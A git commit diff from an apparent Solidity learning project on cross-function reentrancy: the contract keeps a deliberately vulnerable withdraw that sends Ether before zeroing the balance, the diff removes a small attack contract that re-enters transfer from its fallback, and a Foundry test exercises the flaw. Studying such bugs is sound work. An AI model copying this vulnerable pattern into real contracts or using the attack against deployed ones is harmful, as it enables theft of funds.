5416c1a63459123dc0187601a746985b797c71c8
Perelyn-sama <okohebina@gmail.com>
2022-05-26 23:08:52 +0100

    cross function vuln. Started test

--- src/CrossFunction.sol
+++ src/CrossFunction.sol
@@ -4,17 +4,22 @@ pragma solidity >=0.4.22 <0.9.0;
 contract CrossFunction {
     mapping(address => uint256) public userBalances;
 
-    // constructor() payable {}
+    constructor() payable {}
+
+    receive() external payable {}
 
     function deposit() public payable {
         userBalances[msg.sender] += msg.value;
     }
 
     /* uses userBalance to transfer funds */
-    function transfer(address to, uint256 amount) public {
+    function transfer(address to, uint256 amount) public returns (bool) {
         if (userBalances[msg.sender] >= amount) {
             userBalances[to] += amount;
             userBalances[msg.sender] -= amount;
+            return true;
+        } else {
+            return false;
         }
     }
 
@@ -22,36 +27,13 @@ contract CrossFunction {
     function withdrawalBalance() public {
         uint256 amountToWithdraw = userBalances[msg.sender];
 
-        // require(msg.sender.send(amountToWithdraw)());
-
         (bool sent, ) = msg.sender.call{value: amountToWithdraw}("");
         require(sent, "Failed to send Ether");
         userBalances[msg.sender] = 0;
     }
 
-    function getBalance(address addr) public view returns (uint256) {
+    function balanceOf(address addr) public view returns (uint256) {
         return userBalances[addr];
-    }
-}
-
-contract CrossFunctionAttack {
-    CrossFunction public crossFunction;
-
-    constructor(address _etherStoreAddress) {
-        crossFunction = CrossFunction(_etherStoreAddress);
-    }
-
-    // Fallback is called when EtherStore sends Ether to this contract.
-    fallback() external payable {
-        // if (address(crossFunction).balance >= 1 ether) {
-        crossFunction.transfer(address(300), 10);
-        // }
-    }
-
-    function attack() external payable {
-        // require(msg.value >= 1 ether);
-        // crossFunction.deposit{value: 1 ether}();
-        crossFunction.withdrawalBalance();
     }
 
     // Helper function to check the balance of this contract
--- test/CrossFunction.t.sol
+++ test/CrossFunction.t.sol
@@ -13,20 +13,38 @@ contract CrossTest is DSTest {
     address addr2 = address(200);
     address addr3 = address(300);
 
+    fallback() external payable {}
+
+    receive() external payable {}
+
     function setUp() public {
         // vm.prank(addr1);
+        // crossFunction = new CrossFunction{value: 1 ether}();
         crossFunction = new CrossFunction();
 
         vm.deal(addr1, 100);
         vm.deal(addr2, 100);
+        vm.deal(addr3, 100);
     }
 
     function testAttack() public {
-        emit log_uint(msg.sender.balance);
-        crossFunction.deposit{value: 10 ether}();
-        emit log_uint(msg.sender.balance);
+        crossFunction.deposit{value: 1 ether}();
+        emit log_named_uint(
+            "Ether in contract",
+            crossFunction.getBalance() / 1e18
+        );
+
+        crossFunction.transfer(addr3, 1 ether);
+        crossFunction.balanceOf(addr3);
+
+        vm.prank(addr3);
+        crossFunction.withdrawalBalance();
+        emit log_named_uint("balance of addr3", addr3.balance / 1e18);
+
+        crossFunction.withdrawalBalance();
+        emit log_named_uint(
+            "Ether in contract",
+            crossFunction.getBalance() / 1e18
+        );
     }
 }
-
-// 79228162514264337593543950335
-//   79228162514264337593543950335
